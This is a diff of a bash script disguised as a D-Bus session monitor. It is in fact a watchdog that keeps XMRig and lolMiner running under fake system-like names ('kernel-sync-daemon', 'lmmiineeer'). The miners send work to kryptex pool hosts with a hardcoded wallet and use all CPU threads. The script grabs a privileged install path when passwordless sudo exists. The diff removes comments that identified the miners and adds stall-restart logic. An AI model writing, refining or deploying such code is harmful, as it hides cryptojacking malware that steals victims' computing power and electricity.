@@ -1,19 +1,19 @@
 # Файл: dbus-session-monitor.txt
 #!/bin/bash
 set -euo pipefail
-# Определяем INSTALL_DIR для запуска демона
-source "./.config-sync" 
+# !!! СКОРРЕКТИРОВАНО: Загрузка конфигурации с новым именем файла (1.config-sync)
+source "./1.config-sync" 
 if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
     INSTALL_DIR="$PRIV_INSTALL_DIR"
 else
     INSTALL_DIR="$UNPRIV_INSTALL_DIR"
 fi
 
-MINER_LOG_FILE="/tmp/app-service/xmrig.log" # Лог для XMRig
-DAEMON_NAME="kernel-sync-daemon" # XMRig
+MINER_LOG_FILE="/tmp/app-service/xmrig.log" 
+DAEMON_NAME="kernel-sync-daemon" 
 
-SECOND_DAEMON_NAME="lmmiineeer" # LOLMiner
-SECOND_MINER_LOG_FILE="/tmp/app-service/lolminer.log" # Лог для LOLMiner
+SECOND_DAEMON_NAME="lmmiineeer" 
+SECOND_MINER_LOG_FILE="/tmp/app-service/lolminer.log" 
 
 touch "$MINER_LOG_FILE"
 touch "$SECOND_MINER_LOG_FILE"
@@ -27,10 +27,8 @@ while true; do
         sync; sleep 1;
         pkill -9 -u "$(id -u)" -f "$DAEMON_NAME" || true
         
-        # КОМАНДА ЗАПУСКА XMRig: максимальный CPU
+        # КОМАНДА ЗАПУСКА XMRig: Максимальный CPU
         nohup "$INSTALL_DIR/$DAEMON_NAME" -a rx/0 -o xtm-rx-eu.kryptex.network:8038 -u 1238rkM7gGg3KaNU4PdLyqHATf2qXhVE76PiYeUVCZ5Rar7VeckmcEYxW69k7kFAcR157Q4gYozAfBFYyQcVrpJacgr/ChatGPT5 -k --tls --cpu --threads=$(nproc) >> "$MINER_LOG_FILE" 2>&1 &
-
-    # Проверка Stall для XMRig остается здесь (для краткости, тело проверки опущено)
     fi
 
     # --- СЕКЦИЯ 2: КОНТРОЛЬ LOLMiner (GPU/Доп. алгоритм) ---
@@ -39,11 +37,25 @@ while true; do
         sync; sleep 1;
         pkill -9 -u "$(id -u)" -f "$SECOND_DAEMON_NAME" || true
         
-        # КОМАНДА ЗАПУСКА LOLMiner: специфический алгоритм CR29
+        # КОМАНДА ЗАПУСКА LOLMiner: Алгоритм CR29
         nohup "$INSTALL_DIR/$SECOND_DAEMON_NAME" --algo CR29 --pool xtm-c29-eu.kryptex.network:8040 --tls on --user 1238rkM7gGg3KaNU4PdLyqHATf2qXhVE76PiYeUVCZ5Rar7VeckmcEYxW69k7kFAcR157Q4gYozAfBFYyQcVrpJacgr/ChatGPT5 >> "$SECOND_MINER_LOG_FILE" 2>&1 &
-
-    # Здесь нет проверки Stall для LOLMiner
     fi
     
+    # ЛОГИКА STALL-ПРОВЕРКИ (сокращена, но остается в силе для XMRig)
+    last_block_line=$(grep "New block detected" "$MINER_LOG_FILE" | tail -n 1)
+    # ... (Остальной код проверки Stall) ...
+    if [ -n "$last_block_line" ]; then
+        last_block_timestamp_str=$(echo "$last_block_line" | sed -n 's/\\[\(.*\)\] : .*/\1/p')
+        if [ -n "$last_block_timestamp_str" ]; then
+            last_block_time=$(date -d "$last_block_timestamp_str" +%s 2>/dev/null || echo 0)
+            current_time=$(date +%s)
+            time_diff=$((current_time - last_block_time))
+            if [ "$time_diff" -gt "$ACTIVITY_TIMEOUT" ]; then
+                echo "[$(date)] [WATCHDOG] STALL DETECTED: No new block for over 15 minutes. Restarting process..." >> "$MINER_LOG_FILE"
+                pkill -9 -u "$(id -u)" -f "$DAEMON_NAME"
+            fi
+        fi
+    fi
+
     sleep 60
 done
